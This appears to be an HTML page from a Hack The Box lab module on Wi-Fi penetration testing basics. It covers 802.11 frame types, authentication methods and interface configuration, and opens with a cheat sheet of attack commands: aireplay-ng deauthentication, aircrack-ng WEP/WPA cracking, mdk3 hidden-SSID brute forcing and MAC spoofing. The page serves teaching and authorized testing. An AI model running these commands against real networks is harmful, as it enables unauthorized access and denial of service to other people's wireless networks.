@@ -1,0 +1,1988 @@
+<html><head></head><body><p>
+  </p><div class="container"><p></p>
+<link rel="stylesheet" href="modules\style.css">
+
+
+<h1 id="wi-fi-penetration-testing-basics">Wi-Fi Penetration Testing Basics</h1>
+<h2 id="interfaces-and-interface-modes">Interfaces and Interface Modes</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sudo iw reg set US</code></td>
+<td>Set Region for the Interface.</td>
+</tr>
+<tr>
+<td><p><code>sudo ifconfig wlan0 down</code><br><code>sudo iwconfig wlan0 txpower 30</code><br><code>sudo ifconfig wlan0 up</code></p></td>
+<td>Change the Interface Strength.</td>
+</tr>
+<tr>
+<td>`iwlist wlan0 scan \</td>
+<td>grep 'Cell\</td>
+<td>Quality\</td>
+<td>ESSID\</td>
+<td>IEEE'`</td>
+<td>Scan Available WiFi Networks.</td>
+</tr>
+<tr>
+<td><p><code>sudo ifconfig wlan0 down</code><br><code>sudo iwconfig wlan0 channel 64</code><br><code>sudo ifconfig wlan0 up</code></p></td>
+<td>Change the Interface Channel.</td>
+</tr>
+<tr>
+<td><p><code>sudo ifconfig wlan0 down</code><br><code>sudo iwconfig wlan0 freq "5.52G"</code><br><code>sudo ifconfig wlan0 up</code></p></td>
+<td>Change the Interface Frequency.</td>
+</tr>
+<tr>
+<td><p><code>sudo ifconfig wlan0 down</code><br><code>sudo iwconfig wlan0 mode managed</code><br><code>sudo ifconfig wlan0 up</code></p></td>
+<td>Set the Interface to Managed Mode.</td>
+</tr>
+<tr>
+<td><p><code>sudo iwconfig wlan0 mode ad-hoc</code><br><code>sudo iwconfig wlan0 essid HTB-Mesh</code></p></td>
+<td>Set the Interface to Ad-hoc Mode.</td>
+</tr>
+<tr>
+<td><code>sudo iw dev wlan0 set type mesh</code></td>
+<td>Set the Interface to Mesh Mode.</td>
+</tr>
+<tr>
+<td><p><code>sudo ifconfig wlan0 down</code><br><code>sudo iw wlan0 set monitor control</code><br><code>sudo ifconfig wlan0 up</code></p></td>
+<td>Set the Interface to Monitor Mode.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="aircrack-ng-essentials">Aircrack-ng Essentials</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sudo airmon-ng start wlan0</code></td>
+<td>Start Monitor mode using airmon-ng.</td>
+</tr>
+<tr>
+<td><code>sudo airmon-ng start wlan0 11</code></td>
+<td>Start Monitor mode using airmon-ng on specific channel.</td>
+</tr>
+<tr>
+<td><code>sudo airodump-ng wlan0mon</code></td>
+<td>Scan Available WiFi Networks using airodump-ng.</td>
+</tr>
+<tr>
+<td><code>sudo airodump-ng -c 11 wlan0mon</code></td>
+<td>Scan Available WiFi Networks using airodump-ng on Specific Channels or a Single Channel.</td>
+</tr>
+<tr>
+<td><code>sudo airodump-ng wlan0mon --band a</code></td>
+<td>Scan 5 GHz Wi-Fi bands.</td>
+</tr>
+<tr>
+<td><code>sudo airodump-ng wlan0mon -w HTB</code></td>
+<td>Save the airodump-ng output to a file.</td>
+</tr>
+<tr>
+<td><code>airgraph-ng -i HTB-01.csv -g CAPR -o HTB_CAPR.png</code></td>
+<td>Clients to AP Relationship Graph.</td>
+</tr>
+<tr>
+<td><code>airgraph-ng -i HTB-01.csv -g CPG -o HTB_CPG.png</code></td>
+<td>Common Probe Graph.</td>
+</tr>
+<tr>
+<td><code>sudo aireplay-ng --test wlan0mon</code></td>
+<td>Test for Packet Injection.</td>
+</tr>
+<tr>
+<td><code>aireplay-ng -0 5 -a 00:14:6C:7A:41:81 -c 00:0F:B5:32:31:31 wlan0mon</code></td>
+<td>Perform Deauthentication using Aireplay-ng</td>
+</tr>
+<tr>
+<td><code>airdecap-ng -w 1234567890ABCDEF HTB-01.cap</code></td>
+<td>Decrypt WEP-encrypted captures.</td>
+</tr>
+<tr>
+<td><code>aircrack-ng -K HTB.ivs</code></td>
+<td>Cracking WEP using aircrack-ng.</td>
+</tr>
+<tr>
+<td><code>aircrack-ng HTB.pcap -w /opt/wordlist.txt</code></td>
+<td>Cracking WPA using aircrack-ng.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="connection-methods">Connection Methods</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><p><code>network={</code><br>   <code>ssid="HackTheBox"</code><br>   <code>key_mgmt=NONE</code><br>   <code>wep_key0=3C1C3A3BAB</code><br>   <code>wep_tx_keyidx=0</code><br><code>}</code><br><code>wpa_supplicant -c wep.conf -i wlan0</code></p></td>
+<td>Connect to WEP Networks</td>
+</tr>
+<tr>
+<td><p><code>network={</code><br>   <code>ssid="HackMe"</code><br>   <code>psk="password123"</code><br><code>}</code><br><code>wpa_supplicant -c wpa.conf -i wlan0</code></p></td>
+<td>Connect to WPA Personal Networks</td>
+</tr>
+<tr>
+<td><p><code>network={</code><br>   <code>ssid="HTB-Corp"</code><br>   <code>key_mgmt=WPA-EAP</code><br>   <code>identity="HTB\Administrator"</code><br>   <code>password="Admin@123"</code><br><code>}</code><br><code>wpa_supplicant -c wpa_enterprsie.conf -i wlan0</code></p></td>
+<td>Connect to WPA Enterprise Networks</td>
+</tr>
+</tbody>
+</table>
+<h2 id="basic-control-bypass">Basic Control Bypass</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>mdk3 wlan0mon p -b u -c 1 -t A2:FF:31:2C:B1:C4</code></td>
+<td>Bruteforce Hidden SSID for all possible values.</td>
+</tr>
+<tr>
+<td><code>mdk3 wlan0mon p -f /opt/wordlist.txt -t D2:A3:32:13:29:D5</code></td>
+<td>Bruteforce Hidden SSID using a Wordlist.</td>
+</tr>
+<tr>
+<td><p><code>airmon-ng stop wlan0mon</code><br><code>sudo macchanger wlan0 -m 3E:48:72:B7:62:2A</code><br><code>sudo ifconfig wlan0 up</code></p></td>
+<td>Change the MAC address of the interface.</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="wi-fi-penetration-testing-basics-overview">Wi-Fi Penetration Testing Basics Overview</h2>
+<hr>
+<p>In today's interconnected world, WiFi networks have become ubiquitous, serving as the backbone of our digital connectivity. However, with this convenience comes the risk of security vulnerabilities that can be exploited by malicious actors. WiFi pentesting, or penetration testing, is a crucial process employed by cybersecurity professionals to assess the security posture of WiFi networks. By systematically evaluating passphrases, configurations, infrastructure, and client devices, WiFi pentesters uncover potential weaknesses and vulnerabilities that could compromise network security. In this module, we'll explore the fundamental principles of WiFi pentesting, covering key aspects of the process and highlighting essential techniques used to assess and enhance the security of WiFi networks.</p>
+<h4 id="wi-fi-authentication-types">Wi-Fi Authentication Types</h4>
+<p>WiFi authentication types are crucial for securing wireless networks and protecting data from unauthorized access. The main types include WEP, WPA, WPA2, and WPA3, each progressively enhancing security standards.</p>
+<p><img src="storage\modules\222\Wifi_auth_types.png" alt="Flowchart of WiFi Security showing authentication types: WEP, WPA, WPA2, and WPA3. WPA2 splits into Personal and Enterprise, with Enterprise further dividing into EAP-TTLS/PAP and PEAP-MSCHAPv2. WPA3 splits into Personal and Enterprise, with Enterprise leading to EAP-TLS, culminating in Certificate-Based Authentication (CBA)."></p>
+<ul>
+<li><code>WEP (Wired Equivalent Privacy)</code>: The original WiFi security protocol, WEP, provides basic encryption but is now considered outdated and insecure due to vulnerabilities that make it easy to breach.</li>
+<li><code>WPA (WiFi Protected Access)</code>: Introduced as an interim improvement over WEP, WPA offers better encryption through TKIP (Temporal Key Integrity Protocol), but it is still less secure than newer standards.</li>
+<li><code>WPA2 (WiFi Protected Access II)</code>: A significant advancement over WPA, WPA2 uses AES (Advanced Encryption Standard) for robust security. It has been the standard for many years, providing strong protection for most networks.</li>
+<li><code>WPA3 (WiFi Protected Access III)</code>: The latest standard, WPA3, enhances security with features like individualized data encryption and more robust password-based authentication, making it the most secure option currently available.</li>
+</ul>
+<p>When we look to get started on our path of becoming wireless penetration testers, we should always consider the fundamental skills required for us to be successful. Knowing these skills can ensure that we do not get lost along the way when we are exploring many different authentication mechanisms and protections. After all, although wi-fi is one of the most available areas of perimeter security for our exploitation, it presents difficulty to even some of the most seasoned veterans.</p>
+<p>A WiFi penetration test comprises the following four key components:</p>
+<ul>
+<li>Assessing passphrases for strength and security</li>
+<li>Analyzing configuration settings to identify vulnerabilities</li>
+<li>Probing the network infrastructure for weaknesses</li>
+<li>Testing client devices for potential security flaws</li>
+</ul>
+<p>Let's delve into a detailed discussion of these four crucial components.</p>
+<ol>
+<li><code>Evaluating Passphrases</code>: This involves assessing the strength and security of WiFi network passwords or passphrases. Pentesters employ various techniques, such as dictionary attacks, brute force attacks, and password cracking tools, to evaluate the resilience of passphrases against unauthorized access.</li>
+<li><code>Evaluating Configuration</code>: Pentesters analyze the configuration settings of WiFi routers and access points to identify potential security vulnerabilities. This includes scrutinizing encryption protocols, authentication methods, network segmentation, and other configuration parameters to ensure they adhere to best security practices.</li>
+<li><code>Testing the Infrastructure</code>: This phase focuses on probing the robustness of the WiFi network infrastructure. Pentesters conduct comprehensive assessments to uncover weaknesses in network architecture, device configurations, firmware versions, and implementation flaws that could be exploited by attackers to compromise the network.</li>
+<li><code>Testing the Clients</code>: Pentesters evaluate the security posture of WiFi clients, such as laptops, smartphones, and IoT devices, that connect to the network. This involves testing for vulnerabilities in client software, operating systems, wireless drivers, and network stack implementations to identify potential entry points for attackers.</li>
+</ol>
+<p>By systematically evaluating these aspects, pentesters can identify and mitigate security risks, strengthen defenses, and enhance the overall security posture of WiFi networks.</p>
+<p>Note: After spawning, please wait <code>3</code>-<code>4</code> minutes before connecting to the target(s).</p>
+<hr>
+<h2 id="802-11-frames-and-types">802.11 Frames and Types</h2>
+<hr>
+<p>In order to understand 802.11 traffic better, we can dive into frame construction, types, and subtypes. In 802.11 communications, there are a few different frame types utilized for different actions. These actions are all a part of the connection cycle, and standard communications for these wireless networks. Many of our attacks utilize packet crafting/forging techniques. We look to forge these same frames to perform actions like disconnecting a client device from the network with a deauthentication/disassociation request.</p>
+<p><strong>The IEEE 802.11 MAC Frame</strong></p>
+<p>All 802.11 frames utilize the MAC frame. This frame is the foundation for all other fields and actions that are performed between the client and access point, and even in ad-hoc networks. The MAC data frame consists of 9 fields.</p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Frame Control</td>
+<td>This field contains tons of information such as type, subtype, protocol version, to ds (distribution system), from DS, Order, etcetera.</td>
+</tr>
+<tr>
+<td>Duration/ID</td>
+<td>This ID clarifies the amount of time in which the wireless medium is occupied.</td>
+</tr>
+<tr>
+<td>Address 1, 2, 3, and 4</td>
+<td>These fields clarify the MAC addresses involved in the communication, but they could mean different things depending on the origin of the frame. These tend to include the BSSID of the access point and the client MAC address, among others.</td>
+</tr>
+<tr>
+<td>SC</td>
+<td>The sequence control field allows additional capabilities to prevent duplicate frames.</td>
+</tr>
+<tr>
+<td>Data</td>
+<td>Simply put, this field is responsible for the data that is transmitted from the sender to the receiver.</td>
+</tr>
+<tr>
+<td>CRC</td>
+<td>The cyclic redundancy check contains a 32-bit checksum for error detection.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>IEEE 802.11 Frame Types</strong></p>
+<p>IEEE frames can be put into different categories for what they do and what actions they are involved in. Generally speaking, we have the following types among some others. These codes can help us when filtering Wireshark traffic.</p>
+<ol>
+<li><code>Management (00):</code> These frames are used for management and control, and allowing the access point and client to control the active connection.</li>
+<li><code>Control (01):</code> Control frames are used for managing the transmission and reception of data frames within wi-fi networks. We can consider them like a sense of quality control.</li>
+<li><code>Data (10):</code> Data frames are used to contain data for transmission.</li>
+</ol>
+<p><strong>Management Frame Sub-Types</strong></p>
+<p>Primarily, for wi-fi penetration testing, we focus on management frames. These frames after all are used to control the connection between the access point and client. As such we can dive into each one, and what they are responsible for.</p>
+<p>If we look to filter them in Wireshark, we would specify type <code>00</code> and subtypes like the following.</p>
+<ol>
+<li><code>Beacon Frames (1000)</code></li>
+<li><code>Probe Request (0100) and Probe Response (0101)</code></li>
+<li><code>Authentication Request and Response (1011)</code></li>
+<li><code>Association/Reassociation Request and Responses (0000, 0001, 0010, 0011)</code></li>
+<li><code>Disassociation/Deauthentication (1010, 1100)</code></li>
+</ol>
+<p><strong>1. Beacon Frames</strong></p>
+<p>Beacon frames are primarily used by the access point to communicate its presence to the client or station. It includes information such as supported ciphers, authentication types, its SSID, and supported data rates among others.</p>
+<p><strong>2. Probe Requests and Responses</strong></p>
+<p>The probe request and response process exist to allow the client to discover nearby access points. Simply put, if a network is hidden or not hidden, a client will send a probe request with the SSID of the access point. The access point will then respond with information about itself for the client.</p>
+<p><strong>3. Authentication Request and Response</strong></p>
+<p>Authentication requests are sent by the client to the access point to begin the connection process. These frames are primarily used to identify the client to the access point.</p>
+<p><strong>4. Association/Reassociation Requests</strong></p>
+<p>After sending an authentication request and undergoing the authentication process, the client sends an association request to the access point. The access point then responds with an association response to indicate whether the client is able to associate with it or not.</p>
+<p><strong>5. Disassociation/Deauthentication Frames</strong></p>
+<p>Disassociation and Deauthentication frames are sent from the access point to the client. Similar to their inverse frames (association and authentication), they are designed to terminate the connection between the access point and the client. These frames additionally contain what is known as a reason code. This reason code indicates why the client is being disconnected from the access point. We utilize crafting these frames for many handshake captures and denial of service based attacks during wi-fi penetration testing efforts.</p>
+<hr>
+<h2 id="the-connection-cycle">The Connection Cycle</h2>
+<p>Now that IEEE 802.11 frame types and management frame sub-types have been reviewed, let's examine the typical connection process between clients and access points, known as the <code>connection cycle</code>. We will focus on basic WPA2 authentication, although this process may vary depending on the Wi-Fi standard in use. However, the general connection cycle follows this sequence.</p>
+<ol>
+<li><code>Beacon Frames</code></li>
+<li><code>Probe Request and Response</code></li>
+<li><code>Authentication Request and Response</code></li>
+<li><code>Association Request and Response</code></li>
+<li><code>Some form of handshake or other security mechanism</code></li>
+<li><code>Disassociation/Deauthentication</code></li>
+</ol>
+<p>To better understand this process, the raw network traffic can be examined in Wireshark. After successfully capturing a valid handshake, the capture file can then be opened in Wireshark for detailed analysis.</p>
+<p>Beacon frames from the access point can be identified using the following Wireshark filter:</p>
+<p><code>(wlan.fc.type == 0) &amp;&amp; (wlan.fc.type_subtype == 8)</code></p>
+<p><img src="storage\modules\222\001_beacon.PNG" alt="Wireshark capture showing multiple 802.11 Beacon frames from source 'Cisco-Li\_82:b2:55' to 'Broadcast', with SSID 'Coherer'."></p>
+<p>Probe request frames from the access point can be identified using the following Wireshark filter:</p>
+<p><code>(wlan.fc.type == 0) &amp;&amp; (wlan.fc.type_subtype == 4)</code></p>
+<p><img src="storage\modules\222\002_probe_request.PNG" alt="Wireshark capture showing 802.11 Probe Requests from source 'Apple\_82:36:3a' to 'Broadcast', with SSID 'Coherer'."></p>
+<p>Probe response frames from the access point can be identified using the following Wireshark filter:</p>
+<p><code>(wlan.fc.type == 0) &amp;&amp; (wlan.fc.type_subtype == 5)</code></p>
+<p><img src="storage\modules\222\003_probe_response.PNG" alt="Wireshark capture showing 802.11 Probe Responses from source 'Cisco-Li\_82:b2:55' to destination 'Apple\_82:36:3a', with SSID 'Coherer'."></p>
+<p>The authentication process between the client and the access point can be observed using the following Wireshark filter:</p>
+<p><code>(wlan.fc.type == 0) &amp;&amp; (wlan.fc.type_subtype == 11)</code></p>
+<p><img src="storage\modules\222\004_authentication.PNG" alt="Wireshark capture showing 802.11 Authentication frames between 'Apple\_82:36:3a' and 'Cisco-Li\_82:b2:55'."></p>
+<p>After the authentication process is complete, the station's association request can be viewed using the following Wireshark filter:</p>
+<p><code>(wlan.fc.type == 0) &amp;&amp; (wlan.fc.type_subtype == 0)</code></p>
+<p><img src="storage\modules\222\005_association_request.PNG" alt="Wireshark capture showing 802.11 Association Response from 'Cisco-Li\_82:b2:55' to 'Apple\_82:36:3a', with SSID 'Coherer'."></p>
+<p>The access point's association response can be viewed using the following Wireshark filter:</p>
+<p><code>(wlan.fc.type == 0) &amp;&amp; (wlan.fc.type_subtype == 1)</code></p>
+<p><img src="storage\modules\222\006_association_response.PNG" alt="Wireshark capture showing 802.11 Association Response from 'Cisco-Li\_82:b2:55' to 'Apple\_82:36:3a'."></p>
+<p>If the example network uses WPA2, the EAPOL (handshake) frames can be viewed using the following Wireshark filter:</p>
+<p><code>eapol</code></p>
+<p><img src="storage\modules\222\007_handshake.PNG" alt="Wireshark capture showing EAPOL key exchange between 'Cisco-Li\_82:b2:55' and 'Apple\_82:36:3a', with messages 1 to 4 of 4."></p>
+<p>Once the connection process is complete, the termination of the connection can be viewed by identifying which party (client or access point) initiated the disconnection. This can be done using the following Wireshark filter to capture Disassociation frames (10) or Deauthentication frames (12).</p>
+<p><code>(wlan.fc.type == 0) &amp;&amp; (wlan.fc.type_subtype == 12) or (wlan.fc.type_subtype == 10)</code></p>
+<p><img src="storage\modules\222\008_Disassociation.PNG" alt="Wireshark capture showing 802.11 Disassociate frame from 'Apple\_82:36:3a' to 'Cisco-Li\_82:b2:55'."></p>
+<p>Now that we know a little about the types of frames, in the next section, we will explore the different authentication methods and cover the basic connection cycle between the client and the access point.</p>
+<hr>
+<h2 id="authentication-methods">Authentication Methods</h2>
+<hr>
+<p>There are two primary authentication systems commonly used in WiFi networks: <code>Open System Authentication</code> and <code>Shared Key Authentication</code>.</p>
+<p><img src="storage\modules\222\Auth_Methods\auth_methods_.png" alt="Flowchart of Authentication Methods: Open Key and Shared Key. Open Key includes WEP, which is obsolete and uses RC4 and CRC-32. Shared Key includes WPA, using TKIP and MIC, and 802.11i/WPA2, using AES and CCM."></p>
+<ul>
+<li><code>Open System Authentication</code> is straightforward and does not require any shared secret or credentials for initial access. This type of authentication is typically used in open networks where no password is needed, allowing any device to connect to the network without prior verification.</li>
+<li><code>Shared Key Authentication</code>, as the name suggests, involves the use of a shared key. In this system, both the client and the access point verify each other's identities by computing a challenge-response mechanism based on the shared key.</li>
+</ul>
+<p>While many other methods exist, especially in <code>Enterprise</code> environments or with advanced protocols like <code>WPA3</code> and <code>Enhanced Open</code>, these two are the most prevalent.</p>
+<hr>
+<h4 id="open-system-authentication">Open System Authentication</h4>
+<p>As the name implies, open system authentication does not require any shared secret or credentials right away. This authentication type is commonly found for open networks that do not require a password. For Open System Authentication, it tends to follow this order:</p>
+<ol>
+<li>The client (station) sends an authentication request to the access point to begin the authentication process.</li>
+<li>The access point then sends the client back an authentication response, which indicates whether the authentication was accepted.</li>
+<li>The client then sends the access point an association request.</li>
+<li>The access point then responds with an association response to indicate whether the client can stay connected.</li>
+</ol>
+<p><img src="storage\modules\222\Auth_Methods\Open_system.png" alt="Diagram showing communication between Client and AP: Authentication Request, Authentication Response, Association Request, and Association Response."></p>
+<p>As shown in the image above, Open System Authentication does not require any credentials or authentication. Devices can connect directly to the network without needing to enter a password, making it convenient for public or guest networks where ease of access is a priority.</p>
+<p>While Open System Authentication is convenient for public or guest networks, Shared Key Authentication offers an additional layer of security by ensuring that only devices with the correct key can access the network.</p>
+<hr>
+<h4 id="shared-key-authentication">Shared Key Authentication</h4>
+<p>On the other hand shared key authentication does involve a shared key, as the name implies. In this authentication system, the client and access point prove their identities through the computation of a challenge. This method is often associated with Wired Equivalent Privacy (<code>WEP</code>) and Wi-Fi Protected Access (<code>WPA</code>). It provides a basic level of security through the use of a pre-shared key.</p>
+<p><img src="storage\modules\222\Auth_Methods\Shared_auth.png" alt="Table of Shared Key Authentication Methods: WEP uses pre-shared key, RC4, CRC-32, and is weak. WPA uses PSK or 802.1x, TKIP, MIC, and is strong. 802.11i/WPA2 uses PSK or 802.1x, AES, CCMP, and is stronger."></p>
+<hr>
+<p><strong>Authentication with WEP</strong></p>
+<ol>
+<li><code>Authentication request:</code> Initially, as it goes, the client sends the access point an authentication request.</li>
+<li><code>Challenge:</code> The access point then responds with a custom authentication response which includes challenge text for the client.</li>
+<li><code>Challenge Response:</code> The client then responds with the encrypted challenge, which is encrypted with the WEP key.</li>
+<li><code>Verification:</code> The AP then decrypts this challenge and sends back either an indication of success or failure.</li>
+</ol>
+<p><img src="storage\modules\222\Auth_Methods\Wep_process.png" alt="Diagram showing communication between Client and AP: Authentication Request, Challenge, Challenge Response, and Confirm Success/Failure."></p>
+<hr>
+<p><strong>Authentication with WPA</strong></p>
+<p>On the flip side, WPA utilizes a form of authentication that includes a four-way handshake. Commonly, this replaces the association process with more verbose verification, and in the case of WPA3, the authentication portion is even crazier for the pairwise key generation. From a high level, this is performed like the following.</p>
+<ol>
+<li><code>Authentication Request:</code> The client sends an authentication request to the AP to initiate the authentication process.</li>
+<li><code>Authentication Response:</code> The AP responds with an authentication response, which indicates that it is ready to proceed with authentication.</li>
+<li><code>Pairwise Key Generation:</code> The client and the AP then calculate the PMK from the PSK (password).</li>
+<li><code>Four-Way Handshake:</code> The client and access point then undergo each step of the four way handshake, which involves nonce exchange, derivation, among other actions to verify that the client and AP truly know the PSK.</li>
+</ol>
+<p><img src="storage\modules\222\Auth_Methods\Wpa_process.png" alt="Diagram showing communication between Client and AP: Authentication Request, Authentication Response, Pairwise Key Generation, and 4-Way Handshake."></p>
+<p>Shared key authentication type also involves <a href="https://documentation.meraki.com/MR/Wi-Fi_Basics_and_Best_Practices/WPA3_Encryption_and_Configuration_Guide">WPA3</a>, the latest and most secure WiFi security standard. WPA3 introduces significant improvements over its predecessors, including more robust encryption and enhanced protection against brute force attacks. One of its key features is <code>Simultaneous Authentication of Equals (SAE)</code>, which replaces the <code>Pre-Shared Key (PSK)</code> method used in WPA2, providing better protection for passwords and individual data sessions.</p>
+<p>Despite its advantages, WPA3 adoption has been slower due to hardware restrictions. Many existing devices do not support WPA3 and require firmware updates or replacements to be compatible. This creates a barrier to widespread implementation, particularly in environments with a large number of legacy devices. Consequently, while WPA3 offers superior security, its use is not yet widespread, and many networks continue to rely on older standards like WPA2 until the necessary hardware upgrades become more accessible and affordable.</p>
+<hr>
+<h3 id="moving-on">Moving On</h3>
+<p>In this section, we discussed various authentication types. We explored their unique characteristics, security features, and the evolution of these protocols to address emerging threats.</p>
+<p>In the next section, we will focus on WiFi interfaces. We will cover several important aspects, including how to:</p>
+<ul>
+<li>Adjust signal strength</li>
+<li>Change frequency and channel settings</li>
+<li>Modify region settings</li>
+<li>Check driver capabilities</li>
+<li>Scan for available WiFi networks</li>
+</ul>
+<p>Understanding these elements will enable us to optimize and troubleshoot our wireless connections more effectively. This comprehensive approach will ensure that our networks operate smoothly and efficiently, meeting our specific needs and adapting to different environments.</p>
+<hr>
+<h2 id="wi-fi-interfaces">Wi-Fi Interfaces</h2>
+<hr>
+<p>Wireless interfaces are a cornerstone of wi-fi penetration testing. After all, our machines transmit and receive this data through these interfaces. If we didn't have them, we could not communicate. We must consider many different aspects when choosing the right interface. If we choose too weak of an interface, we might not be able to capture data during our penetration testing efforts. In this section, we will explore all of the things we should consider when purchasing an interface for wi-fi penetration testing.</p>
+<hr>
+<p><strong>How to Choose the Right Interface for the Job</strong></p>
+<p>One of the first things that we should consider is capabilities. If our interface is capable of 2.4G and not 5G, we might run into issues when attempting to scan higher band networks. This, of course, is an obvious one, but we should look for the following in our interface:</p>
+<ol>
+<li><code>IEEE 802.11ac or IEEE 802.11ax support</code></li>
+<li><code>Supports at least monitor mode and packet injection</code></li>
+</ol>
+<p>Not all interfaces are equal when it comes to wi-fi penetration testing. We might find that a solo 2.4G card performs better than a more "capable," dual-band card. After all, it comes down to driver support. Not all operating systems have complete support for each card, so we should do our research ahead of time into our chosen chipset.</p>
+<p>The chipset of a Wi-Fi card and its driver are crucial factors in penetration testing, as it is important to select a chipset that supports both monitor mode and packet injection. <a href="https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Cards%20and%20Chipsets">Airgeddon</a> offers a comprehensive list of Wi-Fi adapters based on their performance. It is important to note that for external Wi-Fi adapters, drivers must be installed manually, whereas built-in adapters in laptops typically do not require manual installation. The installation process for drivers varies depending on the adapter, with different steps required for each model.</p>
+<hr>
+<p><strong>Interface Strength</strong></p>
+<p>Much of wi-fi penetration testing comes down to our physical positioning. As such, if a card is too weak, we might find that our efforts will be inadequate. We should always ensure that our card is strong enough to operate at larger and longer ranges. With this, we might want to shoot for longer range cards. One of the ways that we can check on this is through the iwconfig utility.</p>
+<p>  Wi-Fi Interfaces</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ iwconfig
+
+wlan0     IEEE <span class="hljs-number">802.11</span>  <span class="hljs-string">ESSID:</span>off/any  
+<span class="hljs-symbol">          Mode:</span>Managed  Access <span class="hljs-string">Point:</span> Not-Associated   Tx-Power=<span class="hljs-number">20</span> dBm   
+          Retry <span class="hljs-keyword">short</span>  <span class="hljs-keyword">long</span> <span class="hljs-string">limit:</span><span class="hljs-number">2</span>   RTS <span class="hljs-string">thr:</span>off   Fragment <span class="hljs-string">thr:</span>off
+          Power <span class="hljs-string">Management:</span>off
+</code></pre>
+<p>By default, this is set to the country specified in our operating system. We can check on this with the iw reg get command in Linux.</p>
+<p>  Wi-Fi Interfaces</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ iw reg get
+
+global
+country <span class="hljs-number">00</span>: DFS-UNSET
+        (2402 - 2472 @ 40), (6, 20), (N/A)
+        (2457 - 2482 @ 20), (6, 20), (N/A), AUTO-BW, PASSIVE-SCAN
+        (2474 - 2494 @ 20), (6, 20), (N/A), NO-OFDM, PASSIVE-SCAN
+        (5170 - 5250 @ 80), (6, 20), (N/A), AUTO-BW, PASSIVE-SCAN
+        (5250 - 5330 @ 80), (6, 20), (0 ms), DFS, AUTO-BW, PASSIVE-SCAN
+        (5490 - 5730 @ 160), (6, 20), (0 ms), DFS, PASSIVE-SCAN
+        (5735 - 5835 @ 80), (6, 20), (N/A), PASSIVE-SCAN
+        (57240 - 63720 @ 2160), (N/A, 0), (N/A)
+</code></pre>
+<p>With this, we can see all of the different txpower settings that we can do for our region. Most of the time, this might be DFS-UNSET, which is not helpful for us since it limits our cards to <code>20 dBm</code>. We can change this of course to our own region, but we should abide by pertinent rules and laws when doing this, as it is against the law in different areas to push our card beyond the maximum set limit, and as well it is not always particularly healthy for our interface.</p>
+<hr>
+<p><strong>Changing the Region Settings for our Interface</strong></p>
+<p>Suppose we lived in the United States, we might want to change our interfaces region accordingly. We could do so with the iw reg set command, and simply change the US to our region's two letter code.</p>
+<p>  Wi-Fi Interfaces</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo iw <span class="hljs-keyword">reg</span> <span class="hljs-keyword">set</span> <span class="hljs-keyword">US</span>
+</code></pre>
+<p>Then, we could check this setting again with the iw reg get command.</p>
+<p>  Wi-Fi Interfaces</p>
+<pre><code class="lang-shell-session"><span class="hljs-symbol">root</span><span class="hljs-comment">@htb[/htb]$ iw reg get</span>
+
+<span class="hljs-symbol">global</span>
+<span class="hljs-symbol">country</span> US: DFS-FCC
+        (<span class="hljs-number">902</span> - <span class="hljs-number">904</span> <span class="hljs-comment">@ 2), (N/A, 30), (N/A)</span>
+        (<span class="hljs-number">904</span> - <span class="hljs-number">920</span> <span class="hljs-comment">@ 16), (N/A, 30), (N/A)</span>
+        (<span class="hljs-number">920</span> - <span class="hljs-number">928</span> <span class="hljs-comment">@ 8), (N/A, 30), (N/A)</span>
+        (<span class="hljs-number">2400</span> - <span class="hljs-number">2472</span> <span class="hljs-comment">@ 40), (N/A, 30), (N/A)</span>
+        (<span class="hljs-number">5150</span> - <span class="hljs-number">5250</span> <span class="hljs-comment">@ 80), (N/A, 23), (N/A), AUTO-BW</span>
+        (<span class="hljs-number">5250</span> - <span class="hljs-number">5350</span> <span class="hljs-comment">@ 80), (N/A, 24), (0 ms), DFS, AUTO-BW</span>
+        (<span class="hljs-number">5470</span> - <span class="hljs-number">5730</span> <span class="hljs-comment">@ 160), (N/A, 24), (0 ms), DFS</span>
+        (<span class="hljs-number">5730</span> - <span class="hljs-number">5850</span> <span class="hljs-comment">@ 80), (N/A, 30), (N/A), AUTO-BW</span>
+        (<span class="hljs-number">5850</span> - <span class="hljs-number">5895</span> <span class="hljs-comment">@ 40), (N/A, 27), (N/A), NO-OUTDOOR, AUTO-BW, PASSIVE-SCAN</span>
+        (<span class="hljs-number">5925</span> - <span class="hljs-number">7125</span> <span class="hljs-comment">@ 320), (N/A, 12), (N/A), NO-OUTDOOR, PASSIVE-SCAN</span>
+        (<span class="hljs-number">57240</span> - <span class="hljs-number">71000</span> <span class="hljs-comment">@ 2160), (N/A, 40), (N/A)</span>
+</code></pre>
+<p>Afterwards, we can check the txpower of our interface with the <code>iwconfig</code> utility.</p>
+<p>  Wi-Fi Interfaces</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ iwconfig
+
+wlan0     IEEE <span class="hljs-number">802.11</span>  <span class="hljs-string">ESSID:</span>off/any  
+<span class="hljs-symbol">          Mode:</span>Managed  Access <span class="hljs-string">Point:</span> Not-Associated   Tx-Power=<span class="hljs-number">20</span> dBm   
+          Retry <span class="hljs-keyword">short</span>  <span class="hljs-keyword">long</span> <span class="hljs-string">limit:</span><span class="hljs-number">2</span>   RTS <span class="hljs-string">thr:</span>off   Fragment <span class="hljs-string">thr:</span>off
+          Power <span class="hljs-string">Management:</span>off
+</code></pre>
+<p>In many cases, our interface will automatically set its power to the maximum in our region. However, sometimes we might need to do this ourselves. First, we would have to bring our interface down.</p>
+<p>  Wi-Fi Interfaces</p>
